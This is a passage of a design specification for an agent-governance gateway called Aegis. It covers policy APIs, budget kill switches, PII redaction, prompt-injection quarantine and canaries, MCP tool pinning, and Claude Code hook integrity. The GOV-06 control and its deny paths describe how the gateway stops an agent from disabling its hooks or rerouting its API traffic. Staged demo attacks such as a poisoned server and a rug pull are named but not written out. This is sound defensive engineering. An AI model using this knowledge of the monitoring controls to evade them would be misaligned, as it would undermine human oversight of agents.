- **Identity:** `agent` (default `selftest`) resolves via `rt.org.get_agent` → `Identity(org_id, team_id, agent_id, member_id=owner_member_id, role="agent", authenticated=True, display_name)`.
- **Default `text` segments:**
  - `prompt.user` → `prompt` (user, trusted);
  - `model.request` → `messages[0].content` (user, trusted);
  - `model.response` → `content[0].text` (assistant, trusted);
  - `tool.output` → `tool_response` (tool_result, **untrusted**);
  - `mcp.result` → `result.content[0].text` (tool_result, **untrusted**);
  - `mcp.list` → `result.tools[0].description` (tool_description, **untrusted**; `mcp_server` = the `tool_name` prefix);
  - `egress.request` / `egress.response` → `body` (other; trusted / **untrusted**).
- **Macros:** `{{gen:…}}`, `{{b64:…}}`, `{{tags:…}}`, `{{zw:…}}` (plan 02 §2.6), so no secret-shaped strings are committed.
- Refs: P02-#7, P04-G9, P08-G9, P09-#5, P10-G8, P11-req, P13-#6c.

**A-31 · Policy endpoints and status codes** (route `policy.py`).
- **Additive endpoints:**
  - `POST /api/policy/reload` (**admin**) → `ApplyResult`. Calls `reload_from_file()`; this is the fallback when the watcher hiccups.
  - `GET /api/policy/selftest` (member) → `SelfTestRun`, or 404 `not_found` before the first run.
  - `POST /api/policy/selftest` (**admin**) `{which?: "all"|"gate"|"async", profile?}` → `SelfTestRun`.
  - `SelfTestRun` = `{version, profile, ran_at, which, results: SelfTestResult[], skipped: [{name, control, reason}], deferred, passed, failed, gate_failures, latency_ms}`, a page-local TS type.
- `POST /api/policy/validate` accepts the body extra **`selftest: bool = true`**. With `false` it runs parse + schema + semantic checks only and returns `selftest: []`; the policy editor uses this for keystroke validation.
- `POST /api/policy/diff` returns the extra **`rule_id`**, from `rt.approvals.route(...)`.
- [could] `GET /api/policy/effective?profile=` → effective control configs.
- **Status codes:**
  - `apply` / `rollback` → **200** + `ApplyResult` for `applied|pending_approval|rejected|noop`.
  - Stale `base_version` → **409** `{"error": {"type": "conflict", "message", "current_version", "result": ApplyResult}}`.
  - Unparsable YAML on `diff` / `validate` → **422** `invalid_request` + `errors`.
- The UI honours `/governance/policy?tab=history&version=N`.
- **Tests:** in `AEGIS_TEST_MODE=1` the watcher is off, so test-suite's `policy_patch(fn)` fixture edits the temp policy and then awaits `rt.policy.reload_from_file()`, falling back to `apply_yaml(text, actor=None, source="file")`. Multi-step staged examples (EXE-03, EXE-04, BUD-01 402, INJ-05, MCP-03 rug pull, GOV-01 auth, SIG-02 fixtures) live in `tests/cases`, not inline.
- Refs: P02-#1, P02-#2, P02-#12, P17-G1, P17-G2a, P16-G7.

**A-32 · Store extras, proposals and the `config.change` interaction.**
- **`rt.policy` extras** (via `getattr`): `reload_from_file(reason=None) -> ApplyResult`, `run_selftest(snap=None, *, which="all", profile=None) -> SelfTestRun`, `last_selftest() -> SelfTestRun | None`, `status() -> {"state": "ok"|"degraded", "version", "file_in_sync", "last_error"}`.
- **Private table:**
  ```sql
  policy_proposals (id TEXT PRIMARY KEY, created_at TEXT NOT NULL, updated_at TEXT, actor_json TEXT NOT NULL,
                    source TEXT NOT NULL, base_version INTEGER, sha256 TEXT NOT NULL, yaml TEXT, patch_json TEXT,
                    reason TEXT, changes_json TEXT NOT NULL DEFAULT '[]', decision_id TEXT, approval_id TEXT,
                    status TEXT NOT NULL, applied_version INTEGER)
  ```
  with indexes on `sha256` and `decision_id`. IDs use the prefix `pol_`.
- **The `propose()` interaction:** `Interaction(kind="config_change", surface="config.change", direction="out", destination=Destination(name="aegis", dest_class="local"), segments=[], action_type=<kind of the highest-level change>, resource=f"policy:{sha[:16]}", meta={"changes": [PolicyChange.model_dump(mode="json")…], "proposal": {"proposal_id", "sha256", "yaml"|"patch", "base_version", "reason", "source"}})`.
  - It is evaluated **non-dry against the live policy**.
  - **GOV-05** copies `meta.proposal` / `meta.changes` into `ApprovalDraft.payload["proposal"|"changes"]`, sets `draft.resource = interaction.resource`, and routes with `changes=`.
  - `apply_*` called from an approval executor uses `source="approval"`. Auto-kill persistence from budgets-ledger uses `source="budgets-ledger"`. `PolicyVersionInfo.source` is a free string.
- Refs: P02-#3, P02-#4, P02-#9, P07-G11.

**A-33 · Patch grammar, diff semantics, profiles.**
- **PatchOp paths** (shared by budgets-ledger, approvals executors and the dashboard):
  - `budgets.limits[scope=<scope>,window=<window>].<dimension>` (`set`). Use `append` to `budgets.limits` when no entry matches.
  - `budgets.kill_switch.global` (`set`).
  - `budgets.kill_switch.<teams|members|agents|sessions>` (`append`/`remove`).
  - `controls[id=<ID>].<field>`, `destinations.matrix.<CLASS>.<dest>`.
- **`diff_docs`:**
  - fills `summary` and `loosening` on every change;
  - classifies `feed.overrides` edits as `feed.override`, where `enabled: false` / `mode: off` / a weaker action ⇒ `loosening=True`;
  - carries `BudgetLimit.match_agents` in budget changes;
  - classifies `defaults.mode: off` as loosening (owner via `policy-loosen*`).
- **DLP matrix overrides:** DLP-01 (and DLP-02/03 when they read the matrix) apply **`params.matrix_overrides: {CLASS: {dest: action}}`** cell by cell on top of `destinations.matrix`. Profiles use this to tighten (strict/paranoid: `CONFIDENTIAL.third_party: block`).
- **Profile files** (`config/profiles/<p>.yaml`) add the keys `description`, **`floor: bool`** (strict/paranoid: profile values are a floor for knobs pinned in `policy.yaml`; `enabled`/`mode` are never floored) and **`kind_defaults: {deterministic|stateful|semantic|hybrid: {ControlConfig fields}}`**. [could] `overlay`.
- **Precedence** (low → high): frozen defaults → `kind_defaults` → explicit `defaults.fail_mode` / `semantic_timeout_ms` → `profiles[P].controls[X]` → explicit `controls[id=X]` (deep merge for `params`/`scope`) → floor → global `defaults.mode`.
- **action-guards' `x-profiles` deltas** are ported into these files by policy-engine.
- Refs: P02-#6, P02-#10, P02-#11, P07-G7, P10-G8d, P13-#6d.

**A-34 · Whitelisted extension keys** (accepted without "unknown key" warnings, preserved in ruamel round-trips).
- **Top-level sections:** `defaults.selftest_gate`; `budgets.timezone` (IANA, default `Europe/Warsaw`); `BudgetLimit.match_agents: [agent globs]` (for `session:*` / `model:` / `tool:` limits); `providers.<p>.redact_system: bool`.
- **Controls:** `description`, `family`, `when`, `notes`.
- **Approvals:** `approvals.defaults.{grant_ttl_s, max_pending_per_principal, redeem_window_s, deny_cooldown_s, sweep_interval_s, clock_multiplier, escalation}`; `ApprovalRule.{aliases, grant_ttl_s, note, description}`; `ApprovalWhen.{profiles, labels_in, signals_any}`; `approvals.tests`.
- **`PolicyTest` extras:** A-30.
- **Snippet merge:**
  - `approvals.tests` survive the merge.
  - `actions:` are merged **in order**.
  - Control `tests` are appended and deduplicated by `name`.
  - `params` are deep-merged, with the snippet winning except keys tagged `[SF-..]` in `docs/seed-fixes/policy.yaml`.
- Refs: P07-G7, P09-#3, P10-G8c, P02-#7.

**A-35 · Env expansion of mock ports** [should].
- At load time, policy-engine expands `${NAME:-default}` in exactly three fields: `providers.*.base_url`, `mcp.servers.*.url` and `feeds.sources[].url`.
- Only names matching `^AEGIS_[A-Z0-9_]+$` are expanded. Expansion happens on the parsed dict **before** `PolicyDoc` validation, so `snap.doc` holds expanded URLs while `current_yaml()` keeps the literal text.
- Ports: `AEGIS_MOCK_LLM_PORT` (8791), `AEGIS_MOCK_MCP_PORT` (8792), `AEGIS_EXFIL_SINK_PORT` (8793), `AEGIS_MOCK_SAAS_PORT` (8794).
- Fallback without expansion: `run_stack.py --auto-ports` applies a patch as owner via `POST /api/policy/apply` with reason `"run_stack mock port override"`.
- The shipped `config/policy.yaml` keeps **literal** default ports.
- Ref: P20-#2.

---

### A.5 Budgets (owner: budgets-ledger)

**A-36 · Budgets decisions.**
- **Spend accounting:**
  - BUD-01 reserves and settles **`Usage(spend_usd=interaction.amount_usd)`** when `action_type` starts with `spend.` (surfaces `tool.input`, `mcp.call`, `egress.request`). ACT-01 never writes to the ledger.
  - **MCP calls seen twice** (hook `tool.input` + proxy `mcp.call`): the **MCP proxy hop is the accounting owner** for servers listed in `mcp.servers`. On a hook `tool.input` with `mcp_server` in `mcp.servers`, BUD-01 skips `spend_usd`/`tool_calls` accounting, and EXE-04 counts the call once (`dedupe_s`). Both rows still appear in the live feed ("defence in depth").
- **Hard stops:** per A-07. Messages are written for the model to read: `Aegis: agent:chaos-agent@platform day usd budget exhausted (0.50/0.50). Stop and summarise progress.`
- **Loop ladder** (`budgets.loops.ladder`):
  - step 1 `tool_error` = policy block;
  - step 2 = 429 for the session's tool calls during `cooldown_s` (model calls keep flowing);
  - step 3 `kill` = in-memory immediately, persisted via `rt.policy.apply_patch([append budgets.kill_switch.sessions], actor=None, source="budgets-ledger", reason=…)`. Release is a governed `killswitch.off` (admin).
  - Blocked hops are **not** added to the loop history.
- **Dry-run / self-test:** A-09.
- **Demo state:** budgets-ledger reads `demo_state.budget_usage` and `demo_state.kill_switch` from `config/org.seed.yaml` (read-only YAML, not org-rbac's loader). `POST /api/budgets/reset` with no scope also clears loop/runtime-kill state and re-seeds the demo state when `demo_mode` (body extra `reseed: bool`).
- **`rt.ledger.status(scope="agent:<id>")`** returns the `usd`/`day` used even without a configured limit, so org-rbac's `/api/agents` `spend_today_usd` works.
- **Additive endpoints** (route `budgets.py`; page-local TS types):
  - `POST /api/budgets/raise/preview` (member), same body as `/raise` → `{change: PolicyChange, route: ApprovalRoute, viewer_can_apply: bool}`;
  - `GET /api/budgets/enforcement?window=24h` (member) → `{window, loop_detections, by_detector, downgrades, hard_blocks, throttles, step_caps, approvals_requested, kills, cost_avoided_usd, recent: [{ts, kind, scope, detector?, control_id, reason}]}`;
  - `GET /api/budgets/pricing` (member) → `{version, currency, unit, models: [{match, in, out, cache_read, cache_write, compute_s}], tools: [{match, usd}]}`;
  - `POST /api/budgets/usage` (**admin**) `{scope, window?, dimension, amount, reason}` → `{ok, statuses}`. This is a manual usage import and the demo fast-forward lever; it is audited.
  - `GET /api/budgets/history` gains the extra `forecast: {at, used, limit} | null`.
  - `BudgetStatus` gains the extra **`soft_pct: number | null`**.
- **SSE:** `budget.updated` (≤ 2/s), `budget.threshold` (crossing 50/80/100 %), and `killswitch` (published after the policy swap that changes the kill switch, and on runtime auto-kill).
- **Demo agent contract** (demo-mocks-docs):
  - `runaway.py` uses a fixed `X-Aegis-Session` and varies prompts by step index.
  - It calls `mock-echo` with `max_tokens: 4096` and `[[LONG:20000]]`, so the $0.50 wall arrives in about 7 calls.
  - A 200 "approval pending apr_…" reply means: poll `…/wait`, then retry.
- [stretch] Core cancels in-flight upstream streams of a killed principal when it sees the bus `killswitch` event.
- Refs: P07-G6–G12, P07-req, P10-G7, P12-G10, P17-G6.

---

### A.6 Org (owner: org-rbac)

**A-37 · Org extras.**
- **Seed format additions:**
  - `max_destination: local|remote|third_party` (preferred over `max_destination_tier`);
  - tool globs in `<server>.<tool>` form (`mcp__s__t` is still accepted and converted);
  - wire model globs;
  - `control_plane.view_as_aliases`, `control_plane.default_viewer`;
  - agent `status: disabled`;
  - the disabled agent `legacy-bot@platform` and the key `key_expired_demo` (see `docs/seed-fixes/org.seed.yaml`).
- **`rt.org.resources()`:**
  - `{databases: [{id, environment, mcp_server, tables: [{name, sensitivity, categories, contains}]}], vendors: [{id, name, approved, host, plans: [{id, usd, recurring}]}], external_hosts: [{host, tier, dest_class, purpose, denylisted?}], internal_domains: [...]}`;
  - `Agent.meta.data_grants` = `[{database, tables, operations}]` and `Agent.meta.action_types` are kept verbatim;
  - `Member.meta.owner_delegate` marks escalation delegates.
- **Governed member changes** (A-24 org shapes):
  - A change that needs approval answers **403 `approval_required`** (§5.3 envelope with `approval_id`, `required_role`, `expires_at`) instead of `Member`.
  - A denied escalation attempt is audited as `org.changed` `data.outcome="forbidden"`.
  - Self role change → 403; demoting the last owner → 409 `conflict`.
  - The dashboard toasts "Sent for owner approval" with a link and renders `meta.pending_changes` chips.
- **Additive endpoints** (org-rbac prefixes):
  - `GET /api/members/{id}`;
  - `GET /api/org/permissions`;
  - `GET /api/org/changes?status=`;
  - `GET|POST /api/agents/{id}/keys` (admin; `POST` shows the plaintext `key` exactly once);
  - `POST /api/agents/{id}/keys/{key_id}/revoke` (admin);
  - [could] `POST /api/agents`;
  - [could] `POST /api/whoami` (sets the `aegis_view_as` cookie).
- **Additive fields:** `Member.agents`, `Member.meta.pending_changes: [{org_change_id, approval_id, op, to, required_role, expires_at}]`, `Agent.status`, `Agent.spend_today_usd`, `Agent.keys` (no hashes), `OrgResponse.meta`, `WhoAmI.capabilities: Record<string, 'yes'|'approval'|'partial'|'no'>`, `WhoAmI.view_as_options`.
- **Private tables:** `org_meta`, `org_changes` (plan 08 §2.2 DDL). IDs use the prefix `och_`.
- **View-as resolution:** the `X-Aegis-View-As` header > `?view_as=` > the `aegis_view_as` cookie. Values may be a member id, a role alias (`owner|admin|member` → u_katarzyna / u_emily / u_piotr) or a case-insensitive short name (`emily`). Agent short aliases are allowed for `X-Aegis-Agent` (`claude-code`).
- **Members are seeded in seed order.** "First owner" = the lowest rowid.
- Refs: P08-G2–G10, P08-notes, P10-G5.

---

### A.7 Redaction & NER (owner: redaction-engine unless noted)

**A-38 · Single NER instance (semantic-models hosts it, redaction-engine borrows it).**
- semantic-models is the **only** in-process loader of `models/eu-pii-ner`. It shares the XLM-R vocabulary with MiniLM.
- It exposes the extension method **`async rt.semantic.ner(text, *, labels=None, min_scores=None, timeout_s=None) -> dict | None`**, returning `{"model": "eu-pii-ner", "spans": [{"label", "start", "end", "score"}], "latency_ms": float, "truncated": bool}`. Labels are the raw bardsai labels; offsets index the given text; spans carry **no text**. `None` = unavailable.
- redaction-engine (`aegis.redaction.ner`, DLP-07) calls it via `getattr(rt.semantic, "ner", None)`. It owns the label → entity mapping (`PERSON_NAME→PERSON`, `POSTAL_ADDRESS`/`LOCATION`-with-digits → `ADDRESS`, `HEALTH_DATA→HEALTH`, `DATE_OF_BIRTH→DOB`, other Art. 9 labels → `SPECIAL_CATEGORY`), thresholds and the heuristic fallback (`ner_fallback`, `degraded=True`).
- **redaction-engine never creates an ONNX session for eu-pii-ner** (that copy would cost +673 MB).
- `aegis.semantic.shared.xlmr_tokenizer()` is internal to semantic-models. The option of a shared tokenizer through a second session is **rejected**.
- Refs: P06-CG-1, P03-§4.4, HANDOFF known issue.

**A-39 · Placeholder module public API and engine extras.**
- New §3.3 public import surface **`aegis.redaction.placeholders`**:
  - `PLACEHOLDER_RE`, `PARTIAL_PLACEHOLDER_RE`, `MAX_PLACEHOLDER_LEN`;
  - `canonical_key(type, id) -> "[TYPE_ID]"`;
  - `rehydrate_text(text, resolve: Callable[[str], str | None], *, json_string=False) -> tuple[str, int]`;
  - `rehydrate_json_value(obj, resolve) -> tuple[Any, int]`;
  - `StreamRehydrator(resolve, *, json_escape=False)` with `.feed(chunk) -> str`, `.flush() -> str`, `.count`.
- Placeholders are `[ENTITY_N]` (stable per value per session, deterministic for Claude Code's prompt cache). Irreversible drops are `[REDACTED:ENTITY]`.
- **Engine extras** (via `getattr(rt.redactor, …)`, with fallback): `vault_view(ctx)` (`.resolve(key)`, `.values()`, `__len__`), `stream_rehydrator(ctx, *, json_escape=False)`, `rehydrate_obj(ctx, obj) -> obj`, `forget_session(session_id) -> bool`, `session_stats(session_id) -> dict`.
- Claude Code `SessionEnd` calls `forget_session`.
- Ref: P03-§4.2, P03-§10.

**A-40 · Rehydration rules** (binding for core-gateway, claude-code-integration, mcp-proxy and DLP-08).
- **Model responses (`model.response`):** rehydrate only segments whose role is in the DLP-08 decision's `meta.roles` (default `["assistant"]`, i.e. text blocks), and only when DLP-08 returns `meta.rehydrate=true` and `defaults.rehydrate_responses`. **Never rehydrate `tool_use` inputs or `tool_calls` arguments in a model response**: the agent may route them to a remote or third-party tool. The `meta.rehydrate_tool_args` switch is removed.
- **Restore for local tools only:**
  - Claude Code `PreToolUse` → DLP-08 on `tool.input` with `destination.dest_class == "local"` (`destinations.local_tools`) → hook `allow` + `updatedInput` via `rehydrate_obj` (fallback: per-string `rehydrate`). This also covers DLP-03 path placeholders such as `/Users/[USERNAME_1]/…`.
  - MCP proxy → **DLP-08 also applies to `mcp.call`** when the server's destination is `local`, and the proxy writes the rehydrated args back.
  - Respect the matrix: only entity classes whose `matrix[class].local ∈ {allow, log}` are rehydrated. `[PAN_n]` is not rehydrated into `Write`.
- **Never toward `third_party`/`remote`.** An explicit `tool_args.aegis_rehydrate: true` toward `third_party` → block.
- **PostToolUse redact** → `updatedToolOutput`. `UserPromptSubmit` cannot rewrite, so a `redact` on `prompt.user` from the hook becomes `allow` there; the `model.request` hop redacts.
- **Catalog change:** DLP-08 surfaces = `model.response`, `tool.input`, **`mcp.call`**.
- Refs: P03-§4.2, P04-G1(5) (declined), P04-G6, P11-req, P05-req, P12-G4e.

**A-41 · New entity types** (§3.4 table additions; `Span.entity` is a string, so nothing frozen changes).

| Entity | Data class | Category | Notes |
|---|---|---|---|
| `CRYPTO_ADDRESS` | CONFIDENTIAL | pii | BTC base58check/bech32(m), ETH EIP-55; detectors `pii.crypto.btc` / `pii.crypto.eth` |
| `MAC_ADDRESS` | INTERNAL | metadata | device identifier; acted on by DLP-03 |
| `SPECIAL_CATEGORY` | CONFIDENTIAL | pii | GDPR Art. 9 from NER (religion, politics, orientation, ethnicity, union); **off** unless listed in DLP-07 `params.entities` |
| `PROMPT_INJECTION` | — (`data_class=None`) | injection | non-PII redaction entity for INJ quarantine spans; always irreversible |

- **Mappings (no new names):** 26-digit NRB → `IBAN` (`pii.nrb`); URL secret params and cookie session ids → `GENERIC_SECRET`; path usernames → `USERNAME` (`meta.path_username`, DLP-03).
- Refs: P03-§4.3, P05-#1.

**A-42 · `redactor.apply` contract and DLP boundaries.**
- **`Finding.replacement` set** → it is used **verbatim** and is irreversible: never vaulted, `Redaction.reversible=False`, `Redaction.entity = Finding.entity`, `data_class` as given (`None` for `PROMPT_INJECTION`). Quarantine text: `[AEGIS-QUARANTINE: suspected prompt injection removed (<family>)]`.
- **`replacement=None`** → vault-tokenized. That includes INTERNAL entities (`USERNAME`, `HOSTNAME`, `IP_ADDRESS`, `GIT_EMAIL`, `FILE_PATH`, `INTERNAL_URL`, `MAC_ADDRESS`).
- Overlapping spans: the longest wins, and both controls get the same vault placeholder.
- **DLP-01 default entities exclude** category `metadata` / class INTERNAL. **DLP-03 owns them** (priority 90 wins ties).
- **DLP-01 `params.routing_args`** [SF-04]: `{<tool glob>: [arg names]}`. Spans inside those `tool_args` paths (recipient addresses) produce `log` findings only. Default: `{"mailer.*": [to, cc, bcc], "*.send_email": [to, cc, bcc], "*.send_*": [to, cc, bcc, recipient, recipients]}`.
- `rt.redactor.detect()` works on arbitrary short strings (DLP-04 decode-and-rescan). metadata-egress uses `rt.redactor.detect(text, entities={"IP_ADDRESS", "USERNAME", "MAC_ADDRESS"})`.
- **Known-value rescan:** DLP-01 adds exact-match spans for values already in the session vault on every non-local request hop (this replaces staging's InverseCache).
- [could] metadata-egress public surfaces `aegis.egress.metadata.sanitize_bytes(data: bytes, *, images="strip", pdf="strip", office="strip") -> SanitizeResult` and `aegis.egress.headers.plan_headers(headers, *, kind, params=None) -> HeaderPlan`.
- [could] DLP-06 also covers `egress.response` (catalog surfaces += `egress.response`).
- **Audit fingerprints:** DLP-01/02/07 findings carry `Finding.meta.fp = "hmac:" + hmac_hex(canonical_value, purpose="audit")[:16]` (never for CVV/TRACK_DATA). `excerpt` = a type-aware masked preview.
- Refs: P04-G4, P04-G10, P04-G11, P05-#1, P14-G7, P10-G12.

**A-43 · Redaction endpoints** (route `redaction.py`).
- `GET /api/redaction/metrics` (member, `?refresh=1`) → `RedactionMetrics` (page-local TS): `{generated_at, cases, gold, ner_loaded, overall: {precision, recall, f1, leak_rate, leak_rate_validated, hard_negative_fp_rate, finance_benign_fp_rate, case_accuracy}, latency_ms: {p50, p95, per_kb_p95}, by_entity: [{entity, data_class, validated, gold, tp, fp, fn, precision, recall, f1, covering_recall, leak_rate, adversarial_recall}], by_lang, adversarial}`.
- `GET /api/redaction/sessions/{session_id}` (member) → `{session_id, entries, entities: {ENTITY: n}, created_at, last_used, ttl_s}`: counts only.
- `DELETE /api/redaction/sessions/{session_id}` (**admin**) → `{ok, wiped}`.
- The dashboard finds placeholder chips with `\[[A-Z_]+_\d+\]` / `\[REDACTED:[A-Z_]+\]`.
- Ref: P03-§4.3.

---

### A.8 Semantic models & injection

**A-44 · Semantic engine extensions** (owner: semantic-models).
- **Keyword-only extensions** to the protocol methods (structurally compatible):
  - `injection_score(text, *, trusted=True, timeout_s=None, escalate=True)`;
  - `moderate(text, *, mode="prompt", prompt=None, timeout_s=None)`;
  - `judge(rule, text, *, timeout_s=None)`;
  - new `ner(...)` (A-38), `similarity_detail(...)`, `warmup(...)`.
- **Result conventions:**
  - `injection_score` = Horizon PI-small. pg2-22m is off by default; when enabled, `score = max(...)` and `model = "horizon-small+pg2-22m"`.
  - `moderate` = Qwen3Guard prompt mode, `label ∈ {Safe, Controversial, Unsafe}`, score 0.0 / 0.5 / 1.0, with `categories`.
  - `embed()` **returns `[]` or raises** when MiniLM is unavailable. It never returns fake vectors.
  - `judge()` returns a calibrated score (0.70 ≙ raw P(yes) 0.08).
- **Degraded convention:**
  - When degraded, `ScoreResult.reason = "fallback:<code>"` with code ∈ `off|warming|missing|skipped_budget|ram_budget|timeout|error|breaker_open|overload|queue`, and `model="heuristic"`. The engine never raises.
  - New public surface **`aegis.semantic.shared`**: `FALLBACK_REASONS`, `degraded_disposition(result, fail_mode) -> Literal["use","block","allow"]`. INJ-02, INJ-03, MCP-02 and CUS-01 use it.
- **`status()`** is a superset of `PerfResponse.semantic`: `{mode, degraded, health: ok|degraded|off|down, ready, warmup_ms, ram{…}, ollama{url, reachable, version, loaded}, models: [{name, role, backend, loaded, state, p50_ms, p95_ms, calls, errors, fallbacks, escalations, breaker, est_mb, load_ms, last_error}], cache{…}}`.
- **Health wiring:** `/healthz` `components.semantic = status()["health"]`, `components.ollama = "ok"|"down"`, `status: degraded` when semantic is `degraded|down`. audit-metrics: `PerfResponse.semantic = status()` and `StatsKpis.degraded |= status()["degraded"]`.
- **Env / Settings:** `AEGIS_SEMANTIC_MODELS` (CSV of slots, default `horizon-small,minilm-l12-multi,eu-pii-ner,aegis-guard,aegis-judge`) and `AEGIS_SEMANTIC_RAM_MB` (default `2048`).
- **Metrics:** `aegis_semantic_calls_total{model,outcome}` (outcome ∈ ok|cache|fallback|timeout|error|breaker_open), `aegis_semantic_model_up{model}`. Per-model latency goes to `aegis_gateway_overhead_seconds{phase="semantic.<model>"}`.
- **Routes** (`semantic.py`) [could]:
  - `POST /api/semantic/score` (member) `{text, tasks?: ["injection","moderation","adherence"], references?}` → `{results: {task: ScoreResult}}`. It is a dry diagnostic: never audited, capped at 8 kB.
  - `POST /api/semantic/warmup` (admin) `{models?}` → `status()`.
- **CUS-01 `params.rules[]`** is a superset: `{id, text, keywords, deny_terms, action, destinations, surfaces, threshold, description}`.
- Refs: P06-CG-2–CG-9, P05-#4, P19-G-C4.

**A-45 · Injection conventions** (owner: injection-defense).
- **New public surfaces:** `aegis.injection.signatures.scan_text(text, *, trust="untrusted") -> ScanResult` and `aegis.injection.canary.find_canaries(text, canaries) -> list[CanaryHit]`. They are optional reuse points for MCP-02, the semantic heuristic and DLP-05.
- **INJ-01/INJ-02 on untrusted surfaces** (`tool.output`, `mcp.result`, `mcp.list`, `egress.response`, untrusted segments) answer **`redact` (quarantine)**, never `block` (`params.untrusted_action: redact`). On `mcp.list`, quarantining a description is allowed; **MCP-02 owns dropping the tool** [SF-05].
- **Untrusted rule:** a segment is untrusted if `trusted=False`, **or** its role ∈ {`tool_result`, `document`, `tool_description`}, **or** the interaction's surface is untrusted.
- On `model.request`, roles `system`, `assistant`, `tool_args`, `header`, `url` and `tool_description` are skipped. `<system-reminder>` harness blocks are stripped before the scan.
- **INJ-02 default:** `threshold: 0.80`, `timeout_ms: 700`, `fail_mode: deterministic_only`, with a 0.50–0.80 review band escalated to Qwen3Guard [SF-22].
- **Canaries** are planted by configuration: demo agents' system prompts contain `AEGIS-CANARY-7f3a91`. The gateway does not rewrite system prompts. [could] opt-in `params.plant_canary` adds a separate Anthropic `system` text block.
- **INJ-05** (stretch, `mode: monitor`) uses `action_type` `agent.goal_drift` → rule `goal-drift` (self).
- `Decision.meta.inj` (plain JSON) is rendered in the decision drawer and the playground waterfall.
- Refs: P05-#1–#9, P11-req.

---

### A.9 MCP (owner: mcp-proxy)

**A-46 · MCP proxy conventions, endpoints and tables.**
- **Interactions and meta keys:** A-13.
- **Unknown server:** HTTP **404** with JSON-RPC error `{code: -32001, message: "[Aegis] unknown MCP server <name>"}`.
- **Blocked / pending `tools/call`:** HTTP 200, JSON-RPC **result** `{isError: true, content: [{type: "text", text: "[Aegis] Blocked by <ID>: <reason>"}], _meta: {"io.aegis/decision": {decision_id, action, control_id, approval_id, required_role, expires_at}}}`.
- **New §3.3 public surface `aegis.mcp.client`:** `McpHttpClient(base_url, server, headers=None)` with `.list_tools()` and `.call_tool(name, args, wait_s=None, approval_id=None) -> dict`. It speaks modern-era Streamable HTTP. `aegis.sdk.AegisClient.mcp_call()` uses it.
- **Private tables:**
  ```sql
  mcp_tool_candidates (server, tool, hash, definition_json, reason, findings_json, diff_json, approval_id, detected_at,
                       PRIMARY KEY(server, tool))
  mcp_server_state (server PRIMARY KEY, baseline_at, last_list_at, last_error, last_error_at, stale INTEGER)
  ```
  Pins are keyed by the catalog server name.
- **Additive endpoints** (route `mcp_admin.py`; page-local TS):
  - `GET /api/mcp/servers/{server}/tools/{tool}` → `{tool: McpToolView, pinned: object|null, candidate: object|null, diff: object|null, findings: object[], approval_id: string|null}`;
  - `POST /api/mcp/servers/{server}/scan` (**admin**) → `McpServerView`;
  - `GET /api/mcp/claude-config?agent_id=&servers=` → `{mcpServers: {...}}`;
  - `POST /api/mcp/reset` (**admin**, demo pin reset) → `{ok: true}`.
- **`McpToolView` extras in `GET /api/mcp/servers`:** `pinned_hash: string|null`, `diff: {changed_fields, description_diff?, params_added?, params_removed?} | null`, `approval_id: string|null`.
- **Events:**
  - SSE `mcp.tool {server, tool, status, reason}` on quarantine/change/approve;
  - audit `mcp.tool_changed` `data={server, tool, from, to, pinned_hash, hash, approval_id, actor}`;
  - `system` warnings with `component: "mcp:<server>"`.
- **Metrics:** `observe_upstream(provider="mcp:<server>")`, `observe_overhead(phase="mcp")`.
- **Threat feed:** `AEGIS-TI-012` `strip_tool` on `mcp.list` → `Decision(action="redact", mutations=[Mutation(op="remove", path="tool")])`, never `block`.
- [could] MCP-01 also applies to `tool.input` with `mcp_server` set: a Claude Code call to a server not in `mcp.servers` (bypassing the proxy) is blocked.
- **mock_mcp** (owned by mcp-proxy): `GET /_mock/health` → `{service: "mock_mcp"}`. `POST /_mock/reset` also un-flips the rug pull. `acme-crm.lookup_customer` keeps the staged injected note on customer C-6666. Public `mocks.mock_mcp.app:create_app()`.
- Refs: P11-#1–#9, P11-req, P16-G2, P20-#1, P20-#5, P13-req.

---

### A.10 Claude Code integration (owner: claude-code-integration)

**A-47 · Hook client and integration details.**
- **`scripts/aegis-hook`:**
  - takes the event name as `argv[1]`;
  - sends `X-Aegis-Hook-Event` and `X-Aegis-Hook-Deadline`;
  - reads the key from `AEGIS_AGENT_KEY` / `AEGIS_AGENT_KEY_FILE`;
  - uses `AEGIS_HOOK_TIMEOUT` (110) for blocking events and `AEGIS_HOOK_TIMEOUT_FAST` (10) for the others;
  - the settings `timeout` is 120 for `PreToolUse` / `UserPromptSubmit` / `PermissionRequest` / `ConfigChange` and 15 for the others;
  - the command form is `… || exit 2`.
- **Fail-closed behaviour** is as in §5.1.
- **`make claude`** runs `demo/claude/run.sh`: `claude --settings demo/claude/settings.json --setting-sources project --mcp-config demo/claude/mcp.json --strict-mcp-config` (scaffold edits the Makefile; A-58).
- **`demo/claude/mcp.json`** [SF-20]:
  - It routes **every** demo server through `/mcp/{server}`: `acme-db, acme-crm, marketpulse, payments, mailer, web, weather, poisoned, rugpull`. **`payments` is required** for the $480 scene.
  - It sends `Authorization: Bearer <key>` + `X-Aegis-Agent: claude-code@platform`.
  - Generate it with `GET /api/mcp/claude-config` or `python -m aegis.mcp.claude_config`.
- **Tool names:** hooks convert `mcp__s__t` → `s.t` (with `mcp_server`) and keep `meta.claude_code.raw_tool_name`. Approvals volatile keys: A-23.
- **Optional route** `GET /v1/hooks/claude-code/status` (in `hooks_claude_code.py`) → `{sessions: [{session_id, events, last_event, last_seen, model_traffic_seen}], hook_rtt_p50_ms}`. It is used by `check.sh` and the preflight.
- Integration events outside the pipeline emit only bus `system` toasts with `component: "claude-code"`. Decisions come from GOV-06 (A-48).
- **EXE-02 `fs_deny` additions** [SF-19]: `**/demo/claude/settings*.json`, `**/demo/claude/mcp.json`, `**/demo/claude/.agent_key`, `**/.claude/settings*.json`, `**/scripts/aegis-hook`.
- **Before the demo,** `claude update` is needed for `x-claude-code-prompt-id` (2.1.283+).
- Refs: P12-G1, P12-G5–G10, P11-req.

**A-48 · New control GOV-06 "Agent harness integrity (Claude Code)"** [SF-26]. Catalog row (§4.4 addition):

| ID | Name | Owner | Kind | Surfaces | Default action · key params | Prio |
|---|---|---|---|---|---|---|
| GOV-06 | Agent harness integrity (Claude Code) | claude-code-integration | D | prompt.user, tool.input, config.change | `block` · `agents: ["claude-code@*"]`, `protected_paths` (as A-47 fs_deny), `config_change_keys: [hooks, env.ANTHROPIC_BASE_URL, env.ANTHROPIC_CUSTOM_HEADERS, permissions.defaultMode, disableAllHooks]`, `block_bypass_permissions: false` (strict: true), `budget_exhausted_prompt: block` | MVP |

- **Implementation:** `src/aegis/integrations/claude_code/gov06.py` exports `CONTROLS = [HarnessIntegrity()]`, discovered via A-15. Priority 20; OWASP `[ASI03, ASI10, LLM06:2026]`.
